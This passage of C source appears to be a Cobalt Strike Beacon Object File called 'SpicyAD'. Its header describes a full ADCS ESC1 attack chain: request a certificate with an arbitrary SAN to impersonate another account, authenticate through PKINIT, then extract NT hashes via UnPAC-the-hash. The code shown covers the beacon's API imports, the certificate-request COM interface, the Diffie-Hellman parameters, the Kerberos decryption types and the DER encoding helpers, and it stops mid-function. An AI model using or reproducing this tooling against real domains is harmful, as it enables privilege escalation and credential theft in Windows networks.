/*
 * SpicyAD BOF - Complete ADCS ESC1 Attack Chain
 * 
 * Complete attack chain in a single BOF:
 * 1. ESC1 - Request certificate with arbitrary SAN (Subject Alternative Name)
 * 2. PKINIT - Authenticate to KDC using the certificate
 * 3. UnPAC-the-hash - Extract NT hash from PAC credentials
 *
 * Author: SpicyAD
 * Merged from: esc1_full.c + esc1_unpac.c
 */


#ifndef STANDALONE
#ifndef BOF
#define BOF
#endif
#endif

/* Verbose output control - set to 1 for debug output */
#define VERBOSE 0

/* Prevent winsock.h/winsock2.h conflict */
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

/* OLE/COM types needed for ICertRequest interface */
#ifndef BOF
#include <ole2.h>
#include <oleauto.h>
#endif

#include <wincrypt.h>
#include <winldap.h>
#include <dsgetdc.h>
#include <lm.h>

#ifdef BOF
#include "../../include/beacon.h"
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR 0x0d

/* Missing COM type definitions for BOF mode */
typedef void* LPUNKNOWN;
typedef WCHAR OLECHAR;
typedef OLECHAR* LPOLESTR;
typedef OLECHAR* BSTR;
typedef LONG DISPID;
typedef unsigned int UINT;

typedef struct tagEXCEPINFO {
    WORD wCode;
    WORD wReserved;
    BSTR bstrSource;
    BSTR bstrDescription;
    BSTR bstrHelpFile;
    DWORD dwHelpContext;
    PVOID pvReserved;
    PVOID pfnDeferredFillIn;
    LONG scode;
} EXCEPINFO;

typedef struct tagDISPPARAMS {
    void* rgvarg;
    DISPID* rgdispidNamedArgs;
    UINT cArgs;
    UINT cNamedArgs;
} DISPPARAMS;

typedef struct tagVARIANT {
    WORD vt;
    WORD wReserved1;
    WORD wReserved2;
    WORD wReserved3;
    union {
        LONG lVal;
        BSTR bstrVal;
    };
} VARIANT;

typedef void ITypeInfo;

#define CLSCTX_INPROC_SERVER 0x1

/* ICertRequest COM Interface - proper function pointers for method calls */
typedef struct ICertRequestVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void* This, REFIID riid, void** ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(void* This);
    ULONG (STDMETHODCALLTYPE *Release)(void* This);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(void* This, UINT* pctinfo);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(void* This, UINT iTInfo, LCID lcid, ITypeInfo** ppTInfo);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(void* This, REFIID riid, LPOLESTR* rgszNames, UINT cNames, LCID lcid, DISPID* rgDispId);
    HRESULT (STDMETHODCALLTYPE *Invoke)(void* This, DISPID dispIdMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS* pDispParams, VARIANT* pVarResult, EXCEPINFO* pExcepInfo, UINT* puArgErr);
    HRESULT (STDMETHODCALLTYPE *Submit)(void* This, LONG Flags, BSTR strRequest, BSTR strAttributes, BSTR strConfig, LONG* pDisposition);
    HRESULT (STDMETHODCALLTYPE *RetrievePending)(void* This, LONG RequestId, BSTR strConfig, LONG* pDisposition);
    HRESULT (STDMETHODCALLTYPE *GetLastStatus)(void* This, LONG* pStatus);
    HRESULT (STDMETHODCALLTYPE *GetRequestId)(void* This, LONG* pRequestId);
    HRESULT (STDMETHODCALLTYPE *GetDispositionMessage)(void* This, BSTR* pstrDispositionMessage);
    HRESULT (STDMETHODCALLTYPE *GetCACertificate)(void* This, LONG fExchangeCertificate, BSTR strConfig, LONG Flags, BSTR* pstrCertificate);
    HRESULT (STDMETHODCALLTYPE *GetCertificate)(void* This, LONG Flags, BSTR* pstrCertificate);
} ICertRequestVtbl;

typedef struct ICertRequest {
    ICertRequestVtbl* lpVtbl;
} ICertRequest;

#else
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wldap32.lib")
#define BeaconPrintf(t, fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#endif

/*
 * =============================================================================
 * Constants and Structures
 * =============================================================================
 */

/* Kerberos Message Types */
#define KRB_AS_REQ      10
#define KRB_AS_REP      11
#define KRB_ERROR       30

/* PA-DATA Types */
#define PA_PK_AS_REQ    16
#define PA_PK_AS_REP    17
#define PA_PAC_CREDENTIALS 167

/* Encryption Types */
#define ETYPE_AES256_CTS_HMAC_SHA1  18
#define ETYPE_AES128_CTS_HMAC_SHA1  17
#define ETYPE_RC4_HMAC              23

/* Key Usage */
#define KRB_KEY_USAGE_AS_REP_ENCPART    3
#define KRB_KEY_USAGE_PAC_CREDENTIAL    16

/* Certificate Request */
#define CR_IN_BASE64    0x00000001
#define CR_IN_PKCS10    0x00000100
#define CR_OUT_BASE64   0x00000001
#define CR_DISP_INCOMPLETE          0
#define CR_DISP_ERROR               1
#define CR_DISP_DENIED              2
#define CR_DISP_ISSUED              3
#define CR_DISP_ISSUED_OUT_OF_BAND  4
#define CR_DISP_UNDER_SUBMISSION    5
#define CR_DISP_REVOKED             6

/* Base64 decoding flags - use ANY for flexibility with line breaks */
#ifndef CRYPT_STRING_BASE64_ANY
#define CRYPT_STRING_BASE64_ANY     0x00000006
#endif

/* MODP Group 2 - 1024 bit DH parameters (RFC 2409) */
static const BYTE DH_P_MODP2[] = {
    0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    0xC4, 0xC6, 0x62, 0x8B, 0x80, 0xDC, 0x1C, 0xD1,
    0x29, 0x02, 0x4E, 0x08, 0x8A, 0x67, 0xCC, 0x74,
    0x02, 0x0B, 0xBE, 0xA6, 0x3B, 0x13, 0x9B, 0x22,
    0x51, 0x4A, 0x08, 0x79, 0x8E, 0x34, 0x04, 0xDD,
    0xEF, 0x95, 0x19, 0xB3, 0xCD, 0x3A, 0x43, 0x1B,
    0x30, 0x2B, 0x0A, 0x6D, 0xF2, 0x5F, 0x14, 0x37,
    0x4F, 0xE1, 0x35, 0x6D, 0x6D, 0x51, 0xC2, 0x45,
    0xE4, 0x85, 0xB5, 0x76, 0x62, 0x5E, 0x7E, 0xC6,
    0xF4, 0x4C, 0x42, 0xE9, 0xA6, 0x37, 0xED, 0x6B,
    0x0B, 0xFF, 0x5C, 0xB6, 0xF4, 0x06, 0xB7, 0xED,
    0xEE, 0x38, 0x6B, 0xFB, 0x5A, 0x89, 0x9F, 0xA5,
    0xAE, 0x9F, 0x24, 0x11, 0x7C, 0x4B, 0x1F, 0xE6,
    0x49, 0x28, 0x66, 0x51, 0xEC, 0xE6, 0x53, 0x81,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};
static const BYTE DH_G_MODP2[] = { 0x02 };

/* ICertRequest COM Interface */
static const GUID CLSID_CCertRequest = {0x98aff3f0, 0x5524, 0x11d0, {0x88, 0x12, 0x00, 0xa0, 0xc9, 0x03, 0xb8, 0x3c}};
static const GUID IID_ICertRequest = {0x014e4840, 0x5523, 0x11d0, {0x88, 0x12, 0x00, 0xa0, 0xc9, 0x03, 0xb8, 0x3c}};

#define szOID_NT_PRINCIPAL_NAME "1.3.6.1.4.1.311.20.2.3"

/* PKINIT OIDs - RFC 4556 */
#define szOID_PKINIT_AUTHDATA   "1.3.6.1.5.2.3.1"  /* id-pkinit-authData */
#define szOID_PKINIT_DHKEYSDATA "1.3.6.1.5.2.3.2"  /* id-pkinit-DHKeyData */

/* Global state for PKINIT */
static BYTE g_dhPrivateKey[128];
static BYTE g_dhPublicKey[128];
static BYTE g_sessionKey[32];
static BYTE g_replyKey[32];
static int g_nonce;

/*
 * =============================================================================
 * Function Declarations for DFR
 * =============================================================================
 */

#ifdef BOF
/* Winsock */
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT struct hostent* WSAAPI WS2_32$gethostbyname(const char*);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char*);
DECLSPEC_IMPORT unsigned short WSAAPI WS2_32$htons(unsigned short);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$htonl(unsigned long);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$ntohl(unsigned long);

/* Crypto - ADVAPI32 */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextW(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenKey(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyKey(HCRYPTKEY);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenRandom(HCRYPTPROV, DWORD, BYTE*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptCreateHash(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptHashData(HCRYPTHASH, const BYTE*, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGetHashParam(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDestroyHash(HCRYPTHASH);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptExportKey(HCRYPTKEY, HCRYPTKEY, DWORD, DWORD, BYTE*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptImportKey(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptSetKeyParam(HCRYPTKEY, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptDecrypt(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptSignHashW(HCRYPTHASH, DWORD, LPCWSTR, DWORD, BYTE*, DWORD*);

/* Crypto - CRYPT32 */
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptEncodeObjectEx(DWORD, LPCSTR, const void*, DWORD, PCRYPT_ENCODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptDecodeObjectEx(DWORD, LPCSTR, const BYTE*, DWORD, DWORD, PCRYPT_DECODE_PARA, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptBinaryToStringA(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertStrToNameA(DWORD, LPCSTR, DWORD, void*, BYTE*, DWORD*, LPCSTR*);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertCreateCertificateContext(DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$CertOpenStore(LPCSTR, DWORD, HCRYPTPROV_LEGACY, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertCloseStore(HCERTSTORE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertAddCertificateContextToStore(HCERTSTORE, PCCERT_CONTEXT, DWORD, PCCERT_CONTEXT*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CertSetCertificateContextProperty(PCCERT_CONTEXT, DWORD, DWORD, const void*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$PFXExportCertStoreEx(HCERTSTORE, CRYPT_DATA_BLOB*, LPCWSTR, void*, DWORD);
DECLSPEC_IMPORT HCERTSTORE WINAPI CRYPT32$PFXImportCertStore(CRYPT_DATA_BLOB*, LPCWSTR, DWORD);
DECLSPEC_IMPORT PCCERT_CONTEXT WINAPI CRYPT32$CertEnumCertificatesInStore(HCERTSTORE, PCCERT_CONTEXT);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT, DWORD, void*, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE*, DWORD*, BOOL*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptSignMessage(PCRYPT_SIGN_MESSAGE_PARA, BOOL, DWORD, const BYTE*[], DWORD[], BYTE*, DWORD*);
DECLSPEC_IMPORT HCRYPTMSG WINAPI CRYPT32$CryptMsgOpenToEncode(DWORD, DWORD, DWORD, const void*, LPSTR, PCMSG_STREAM_INFO);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgUpdate(HCRYPTMSG, const BYTE*, DWORD, BOOL);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgGetParam(HCRYPTMSG, DWORD, DWORD, void*, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptMsgClose(HCRYPTMSG);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptExportPublicKeyInfo(HCRYPTPROV, DWORD, DWORD, PCERT_PUBLIC_KEY_INFO, DWORD*);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptSignAndEncodeCertificate(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE, DWORD, DWORD, LPCSTR, const void*, PCRYPT_ALGORITHM_IDENTIFIER, const void*, BYTE*, DWORD*);

/* COM */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateGuid(GUID*);
DECLSPEC_IMPORT BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void WINAPI OLEAUT32$SysFreeString(BSTR);

/* NetAPI */
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, PDOMAIN_CONTROLLER_INFOW*);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

/* Kernel32 */
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

/* MSVCRT */
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcat(char*, const char*);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char*, int);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char*, const char*);
DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT time_t __cdecl MSVCRT$time(time_t*);

/* DFR macros */
#define WSAStartup WS2_32$WSAStartup
#define WSACleanup WS2_32$WSACleanup
#define socket WS2_32$socket
#define connect WS2_32$connect
#define send WS2_32$send
#define recv WS2_32$recv
#define closesocket WS2_32$closesocket
#define gethostbyname WS2_32$gethostbyname
#define inet_addr WS2_32$inet_addr
#define htons WS2_32$htons
#define htonl WS2_32$htonl
#define ntohl WS2_32$ntohl

#define CryptAcquireContextW ADVAPI32$CryptAcquireContextW
#define CryptReleaseContext ADVAPI32$CryptReleaseContext
#define CryptGenKey ADVAPI32$CryptGenKey
#define CryptDestroyKey ADVAPI32$CryptDestroyKey
#define CryptGenRandom ADVAPI32$CryptGenRandom
#define CryptCreateHash ADVAPI32$CryptCreateHash
#define CryptHashData ADVAPI32$CryptHashData
#define CryptGetHashParam ADVAPI32$CryptGetHashParam
#define CryptDestroyHash ADVAPI32$CryptDestroyHash
#define CryptExportKey ADVAPI32$CryptExportKey
#define CryptImportKey ADVAPI32$CryptImportKey
#define CryptSetKeyParam ADVAPI32$CryptSetKeyParam
#define CryptDecrypt ADVAPI32$CryptDecrypt
#define CryptSignHashW ADVAPI32$CryptSignHashW

#define CryptEncodeObjectEx CRYPT32$CryptEncodeObjectEx
#define CryptDecodeObjectEx CRYPT32$CryptDecodeObjectEx
#define CryptBinaryToStringA CRYPT32$CryptBinaryToStringA
#define CryptStringToBinaryA CRYPT32$CryptStringToBinaryA
#define CertStrToNameA CRYPT32$CertStrToNameA
#define CertCreateCertificateContext CRYPT32$CertCreateCertificateContext
#define CertFreeCertificateContext CRYPT32$CertFreeCertificateContext
#define CertOpenStore CRYPT32$CertOpenStore
#define CertCloseStore CRYPT32$CertCloseStore
#define CertAddCertificateContextToStore CRYPT32$CertAddCertificateContextToStore
#define CertSetCertificateContextProperty CRYPT32$CertSetCertificateContextProperty
#define PFXExportCertStoreEx CRYPT32$PFXExportCertStoreEx
#define PFXImportCertStore CRYPT32$PFXImportCertStore
#define CertEnumCertificatesInStore CRYPT32$CertEnumCertificatesInStore
#define CryptAcquireCertificatePrivateKey CRYPT32$CryptAcquireCertificatePrivateKey
#define CryptSignMessage CRYPT32$CryptSignMessage
#define CryptExportPublicKeyInfo CRYPT32$CryptExportPublicKeyInfo
#define CryptSignAndEncodeCertificate CRYPT32$CryptSignAndEncodeCertificate
#define CryptMsgOpenToEncode CRYPT32$CryptMsgOpenToEncode
#define CryptMsgUpdate CRYPT32$CryptMsgUpdate
#define CryptMsgGetParam CRYPT32$CryptMsgGetParam
#define CryptMsgClose CRYPT32$CryptMsgClose

#define CoInitializeEx OLE32$CoInitializeEx
#define CoUninitialize OLE32$CoUninitialize
#define CoCreateInstance OLE32$CoCreateInstance
#define CoCreateGuid OLE32$CoCreateGuid
#define SysAllocString OLEAUT32$SysAllocString
#define SysFreeString OLEAUT32$SysFreeString

#define DsGetDcNameW NETAPI32$DsGetDcNameW
#define NetApiBufferFree NETAPI32$NetApiBufferFree

#define LocalAlloc KERNEL32$LocalAlloc
#define LocalFree KERNEL32$LocalFree
#define LoadLibraryA KERNEL32$LoadLibraryA
#define GetProcAddress KERNEL32$GetProcAddress
#define FreeLibrary KERNEL32$FreeLibrary
#define MultiByteToWideChar KERNEL32$MultiByteToWideChar
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte
#define GetSystemTime KERNEL32$GetSystemTime
#define WriteFile KERNEL32$WriteFile
#define CreateFileW KERNEL32$CreateFileW
#define CloseHandle KERNEL32$CloseHandle
#define ReadFile KERNEL32$ReadFile
#define GetFileSize KERNEL32$GetFileSize
#define GetLastError KERNEL32$GetLastError

#define malloc MSVCRT$malloc
#define free MSVCRT$free
#define memset MSVCRT$memset
#define memcpy MSVCRT$memcpy
#define memcmp MSVCRT$memcmp
#define strlen MSVCRT$strlen
#define wcslen MSVCRT$wcslen
#define sprintf MSVCRT$sprintf
#define swprintf MSVCRT$swprintf
#define strcpy MSVCRT$strcpy
#define strcat MSVCRT$strcat
#define strchr MSVCRT$strchr
#define wcscpy MSVCRT$wcscpy
#define _stricmp MSVCRT$_stricmp
#define rand MSVCRT$rand
#define srand MSVCRT$srand
#define time MSVCRT$time


/*
 * =============================================================================
 * LDAP DFR - SID Lookup Support for KB5014754 Strong Certificate Mapping
 * =============================================================================
 */

/* LDAP DFR declarations */
DECLSPEC_IMPORT LDAP* WINAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_free_len(struct berval**);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_optionW(LDAP*, int, const void*);

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$IsValidSid(PSID);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);

#define ldap_initW WLDAP32$ldap_initW
#define ldap_bind_sW WLDAP32$ldap_bind_sW
#define ldap_search_sW WLDAP32$ldap_search_sW
#define ldap_unbind WLDAP32$ldap_unbind
#define ldap_first_entry WLDAP32$ldap_first_entry
#define ldap_get_values_lenW WLDAP32$ldap_get_values_lenW
#define ldap_value_free_len WLDAP32$ldap_value_free_len
#define ldap_msgfree WLDAP32$ldap_msgfree
#define ldap_set_optionW WLDAP32$ldap_set_optionW

#define ConvertSidToStringSidA ADVAPI32$ConvertSidToStringSidA
#define IsValidSid ADVAPI32$IsValidSid
#define GetLengthSid ADVAPI32$GetLengthSid

#endif /* BOF */

/*
 * =============================================================================
 * cryptdll.dll types for Kerberos decryption
 * =============================================================================
 */

/* CDLocateCSystem function pointer type */
typedef int (WINAPI *CDLocateCSystem_t)(int, void**);
typedef int (WINAPI *CDLocateCheckSum_t)(int, void**);

/*
 * =============================================================================
 * KERB_ECRYPT Structure for cryptdll.dll
 * =============================================================================
 */

typedef struct _KERB_ECRYPT {
    int Type0;
    int BlockSize;
    int Type1;
    int KeySize;
    int Size;
    int Type2;
    int Type3;
    void* AlgName;
    void* Initialize;
    void* Encrypt;
    void* Decrypt;
    void* Finish;
    void* HashPassword;
    void* RandomKey;
    void* Control;
} KERB_ECRYPT;

typedef int (WINAPI *KERB_ECRYPT_Initialize)(BYTE* key, int keySize, int keyUsage, void** pContext);
typedef int (WINAPI *KERB_ECRYPT_Decrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
typedef int (WINAPI *KERB_ECRYPT_Finish)(void** pContext);

/*
 * =============================================================================
 * ASN.1/DER Encoding Functions
 * =============================================================================
 */

/* Encode length in DER format */
static int EncodeLength(BYTE* buf, int len) {
    if (len < 128) {
        buf[0] = (BYTE)len;
        return 1;
    } else if (len < 256) {
        buf[0] = 0x81;
        buf[1] = (BYTE)len;
        return 2;
    } else if (len < 65536) {
        buf[0] = 0x82;
        buf[1] = (BYTE)(len >> 8);
        buf[2] = (BYTE)(len & 0xFF);
        return 3;
    } else {
        buf[0] = 0x83;
        buf[1] = (BYTE)(len >> 16);
        buf[2] = (BYTE)((len >> 8) & 0xFF);
        buf[3] = (BYTE)(len & 0xFF);
        return 4;
    }
}

/* Decode DER length */
static int DecodeLength(BYTE* data, int offset, int* length) {
    if ((data[offset] & 0x80) == 0) {
        *length = data[offset];
        return 1;
    } else {
        int numBytes = data[offset] & 0x7F;
        *length = 0;
        for (int i = 1; i <= numBytes; i++) {
            *length = (*length << 8) | data[offset + i];
        }
        return 1 + numBytes;
    }
}

/* Build DER SEQUENCE */
static BYTE* BuildSequence(BYTE* content, int contentLen, int* outLen) {
    int lenSize;
    BYTE lenBuf[4];
    BYTE* result;

    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x30; /* SEQUENCE */
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, content, contentLen);

    return result;
}

/* Build DER INTEGER from int */
static BYTE* BuildInteger(int value, int* outLen) {
    BYTE* result;
    if (value >= 0 && value < 128) {
        *outLen = 3;
        result = (BYTE*)malloc(3);
        result[0] = 0x02;
        result[1] = 0x01;
        result[2] = (BYTE)value;
    } else if (value >= 0 && value < 256) {
        *outLen = 4;
        result = (BYTE*)malloc(4);
        result[0] = 0x02;
        result[1] = 0x02;
        result[2] = 0x00;
        result[3] = (BYTE)value;
    } else {
        *outLen = 6;
        result = (BYTE*)malloc(6);
        result[0] = 0x02;
        result[1] = 0x04;
        result[2] = (BYTE)(value >> 24);
        result[3] = (BYTE)(value >> 16);
        result[4] = (BYTE)(value >> 8);
        result[5] = (BYTE)value;
    }
    return result;
}

/* Build DER INTEGER from bytes */
static BYTE* BuildIntegerFromBytes(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];
    int needPadding = (data[0] & 0x80) ? 1 : 0;
    int totalDataLen = dataLen + needPadding;

    lenSize = EncodeLength(lenBuf, totalDataLen);
    *outLen = 1 + lenSize + totalDataLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x02; /* INTEGER */
    memcpy(result + 1, lenBuf, lenSize);
    if (needPadding) {
        result[1 + lenSize] = 0x00;
        memcpy(result + 2 + lenSize, data, dataLen);
    } else {
        memcpy(result + 1 + lenSize, data, dataLen);
    }

    return result;
}

/* Build DER OCTET STRING */
static BYTE* BuildOctetString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];

    lenSize = EncodeLength(lenBuf, dataLen);
    *outLen = 1 + lenSize + dataLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x04; /* OCTET STRING */
    memcpy(result + 1, lenBuf, lenSize);
    memcpy(result + 1 + lenSize, data, dataLen);

    return result;
}

/* Build DER BIT STRING */
static BYTE* BuildBitString(BYTE* data, int dataLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];

    lenSize = EncodeLength(lenBuf, dataLen + 1);
    *outLen = 1 + lenSize + 1 + dataLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0x03; /* BIT STRING */
    memcpy(result + 1, lenBuf, lenSize);
    result[1 + lenSize] = 0x00; /* unused bits */
    memcpy(result + 2 + lenSize, data, dataLen);

    return result;
}

/* Build Context Tag [n] */
static BYTE* BuildContextTag(int tagNum, BYTE* content, int contentLen, int* outLen) {
    BYTE* result;
    int lenSize;
    BYTE lenBuf[4];

    lenSize = EncodeLength(lenBuf, contentLen);
    *outLen = 1 + lenSize + contentLen;
    result = (BYTE*)malloc(*outLen);

    result[0] = 0xA0 | tagNum; /* Context tag */
